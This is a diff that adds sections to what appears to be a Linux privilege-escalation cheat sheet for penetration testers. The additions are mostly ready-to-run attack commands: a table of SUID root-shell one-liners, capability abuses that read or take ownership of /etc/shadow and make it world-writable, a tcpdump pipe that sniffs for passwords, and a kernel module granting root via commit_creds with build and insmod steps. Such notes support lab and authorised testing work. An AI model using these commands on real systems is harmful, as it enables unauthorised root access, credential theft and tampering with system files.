@@ -22,6 +22,25 @@ grep -E '^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' /proc/$$/statu
 ```
 - Look up the binary on GTFOBins under the SUID or Capabilities context, not Sudo.
 
+## SUID one-liners (offline)
+Owner must be root; confirm with `ls -l` first. Look up anything missing from this list on GTFOBins under its SUID context.
+
+| Binary | Shell |
+| --- | --- |
+| `find` | `find . -exec /bin/sh -p \; -quit` |
+| `bash` | `bash -p` |
+| `env` | `env /bin/sh -p` |
+| `python3` | `python3 -c 'import os; os.execl("/bin/sh","sh","-p")'` |
+| `vi` / `vim` | `vi -c ':set shell=/bin/sh\ -p | shell'` |
+| `php` | `php -r 'pcntl_exec("/bin/sh", ["-p"]);'` |
+| `nmap` (2.02–5.21) | `nmap --interactive`, then `!sh` |
+| `systemctl` | unit-file trick, same as [sudo](sudo.md#common-sudo--gtfobins-one-liners-offline) minus `sudo -u` |
+| `cp` / `base64` / `xxd` / `dd` | file read/write as root (no `-p` needed, no shell) |
+| `pkexec` | not a GTFOBins SUID entry: it's itself setuid root by design → [PwnKit](kernel-checks.md#known-cve-patterns) |
+
+- `perl` has no SUID shell in GTFOBins (only a `CAP_SETUID` capability path, below): don't expect `perl -e 'exec "/bin/sh"'` to keep root from a bare SUID bit.
+- Pager/editor rows need a real TTY: [stabilize the shell](../foothold/shells.md#stabilize-a-linux-tty) first.
+
 ## What changes
 | Mechanism | Effect |
 | --- | --- |
@@ -67,8 +86,50 @@ findmnt -T <PATH> -o TARGET,FSTYPE,OPTIONS
 | `CAP_DAC_OVERRIDE` | Bypass read/write permission checks |
 | `CAP_SYS_PTRACE` | Inspect/control processes (namespace and policy permitting) |
 | `CAP_SYS_ADMIN` | Broad, namespace-dependent: check the operation and container context |
+| `CAP_CHOWN` | Reassign any file to yourself, ignoring the current owner |
+| `CAP_FOWNER` | Bypass owner-only checks (`chmod`, `chown` target, `unlink`) on files you don't own |
+| `CAP_NET_RAW` | Raw sockets: sniff with a binary that holds it |
+| `CAP_SYS_MODULE` | Load a kernel module: arbitrary kernel-mode code |
 
 - The capability lives in the process that holds it: a spawned `cat` child does not inherit it.
+
+## Read with cap_dac_read_search
+Bypasses the read/traverse permission check in the kernel; the file's own mode stops mattering.
+```bash
+tar cf /tmp/out.tar --absolute-names /etc/shadow
+tar xf /tmp/out.tar -O
+python3 -c 'print(open("/etc/shadow").read())'
+```
+- Not a GTFOBins-catalogued context for `tar`; this is the standard DAC_READ_SEARCH bypass, confirmed against GNU tar's own `--absolute-names` option.
+
+## cap_net_raw
+```bash
+tcpdump -i any -A -nn | grep -iE 'user|pass|login'
+```
+- Needs an interface you can see traffic on; a container's own veth sees little.
+
+## cap_chown / cap_fowner
+```bash
+chown $(id -un) /etc/shadow
+chmod 666 /etc/shadow
+```
+Edit the file directly once you own it or it's world-writable: [readable secrets](misc-vectors.md#readable-secrets) for the passwd-line format.
+
+## cap_sys_module
+Only when `/lib/modules/$(uname -r)/build` exists (matching kernel headers).
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/cred.h>
+MODULE_LICENSE("GPL");
+int init_module(void) { commit_creds(prepare_kernel_cred(0)); return 0; }
+void cleanup_module(void) {}
+```
+```bash
+echo 'obj-m += pwn.o' > Makefile
+make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+insmod ./pwn.ko
+```
 
 ## Misleading leads
 | Finding | Meaning |
